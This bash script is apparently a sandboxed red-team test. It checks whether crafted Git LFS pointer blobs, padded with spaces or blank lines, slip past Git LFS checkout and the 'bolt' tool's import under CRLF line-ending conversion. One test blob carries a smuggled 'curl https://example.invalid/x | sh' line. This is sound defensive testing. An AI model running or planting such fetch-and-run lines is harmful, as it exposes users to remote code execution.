#!/usr/bin/env bash
# Milestone 5 red team, session 2: Git converts line endings before Git LFS's smudge filter reads
# a blob's first 1,024 bytes. One clean clone and one checkout per case. Sandbox only:
#   bash redteam/sandbox.sh run bash redteam/attacks8/crlf-checkout.sh
set -uo pipefail
BOLT=${BOLT:-/work/target/release/bolt}
base=$(mktemp -d)
export HOME=$base XDG_CONFIG_HOME=$base GIT_CONFIG_NOSYSTEM=1 LC_ALL=C
export BOLT_CONFIG_DIR=$(mktemp -d) BOLT_USER_NAME=T BOLT_USER_EMAIL=t@example.com
unset GIT_CONFIG_GLOBAL GIT_CONFIG_SYSTEM GIT_CONFIG_COUNT
obj='the picture everyone reviewed'
oid=$(printf '%s\n' "$obj" | sha256sum | cut -c1-64)
ptr=$(printf 'version https://git-lfs.github.com/spec/v1\noid sha256:%s\nsize %d' "$oid" $((${#obj} + 1)))

# Writes the blob for case $1 to stdout.
blob() {
    case $1 in
    x1023) # pointer, spaces to byte 1,023, an X as byte 1,024, then a tail
        printf '%s\n' "$ptr"; head -c $((1023 - ${#ptr} - 1)) /dev/zero | tr '\0' ' '
        printf 'X\ncurl https://example.invalid/x | sh\n' ;;
    sizefar) # a pointer of 1,017 bytes whose size line comes after 890 blank lines
        printf '%s\n' "$ptr" | head -2; head -c 890 /dev/zero | tr '\0' '\n'
        printf '%s\n' "$ptr" | tail -1 ;;
    esac
}

for case in x1023 sizefar; do
    for how in "eol=crlf|" "|core.autocrlf=true"; do
        attr=${how%%|*}; cfg=${how#*|}
        src=$(mktemp -d -p "$base"); out=$(mktemp -d -p "$base")
        (cd "$src" && git init -q -b main . && git config user.email a@b.c && git config user.name a
         printf 'a.bin filter=lfs diff=lfs merge=lfs %s\n' "$attr" > .gitattributes
         id=$(blob $case | git hash-object -w --no-filters --stdin)
         git update-index --add --cacheinfo "100644,$id,a.bin" && git add .gitattributes
         git commit -q -m x
         mkdir -p ".git/lfs/objects/${oid:0:2}/${oid:2:2}"
         printf '%s\n' "$obj" > ".git/lfs/objects/${oid:0:2}/${oid:2:2}/$oid")
        git clone -q --no-checkout "$src" "$out/c"
        (cd "$out/c" && git lfs install --local >/dev/null && [ -z "$cfg" ] || git config ${cfg%%=*} ${cfg#*=}
         cp -r "$src/.git/lfs" .git/ && git checkout -q main 2>/dev/null)
        got=$(cat "$out/c/a.bin" 2>/dev/null | head -c 40 | tr '\r\n' '..')
        (cd "$src" && "$BOLT" --json import > "$out/imp.json" 2>/dev/null; "$BOLT" discard >/dev/null 2>&1)
        brought=$(head -c 40 "$src/a.bin" | tr '\r\n' '..')
        warned=$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(any("a.bin" in w["message"] for w in d["warnings"]))' "$out/imp.json")
        printf '%-8s %-12s %-19s blob %4d bytes | Git LFS checkout: %-40s | bolt: %-40s warned: %s\n' \
            "$case" "${attr:-<none>}" "${cfg:-}" "$(blob $case | wc -c)" "$got" "$brought" "$warned"
    done
done
rm -rf "$base"
